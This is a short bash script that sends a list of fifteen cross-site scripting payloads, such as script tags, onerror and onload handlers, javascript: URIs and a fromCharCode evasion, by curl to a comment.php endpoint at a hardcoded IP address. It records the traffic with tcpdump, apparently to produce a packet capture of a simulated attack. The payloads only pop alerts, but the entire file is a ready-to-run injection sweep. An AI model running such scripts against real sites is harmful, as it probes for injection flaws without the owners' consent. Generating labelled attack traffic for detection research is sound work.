#!/bin/bash

TARGET="http://205.174.165.68/comment.php"
INTERFACE="eth0"
PCAP_FILE="xss_attack_$(date +%Y%m%d_%H%M%S).pcap"

PAYLOADS=(
  "<script>alert(1)</script>"
  "<img src=x onerror=alert(1)>"
  "<svg/onload=alert(1)>"
  "<body onload=prompt(1)>"
  "<iframe src=javascript:alert(1)>"
  "<a href='javascript:alert(1)'>Click</a>"
  "<input onfocus=alert(1) autofocus>"
  "<marquee onstart=alert(1)>XSS</marquee>"
  "<object data='javascript:alert(1)'></object>"
  "'\"><script>alert('XSS')</script>"
  "';alert(String.fromCharCode(88,83,83));//"
  "<math><mi>x</mi><mtext><script>alert(1)</script></mtext></math>"
  "<img src=1 href=1 onerror=alert(1)>"
  "<details open ontoggle=alert(1)>"
  "<audio src onerror=alert(1)>"
)

echo "[*] Starting tcpdump..."
tcpdump -i "$INTERFACE" host 205.174.165.68 -w "$PCAP_FILE" &
TCPDUMP_PID=$!

for payload in "${PAYLOADS[@]}"; do
  curl -s "$TARGET?comment=$(printf %s "$payload" | jq -s -R -r @uri)" > /dev/null
done

kill "$TCPDUMP_PID"
echo "[✅] XSS simulation complete. PCAP saved to $PCAP_FILE"
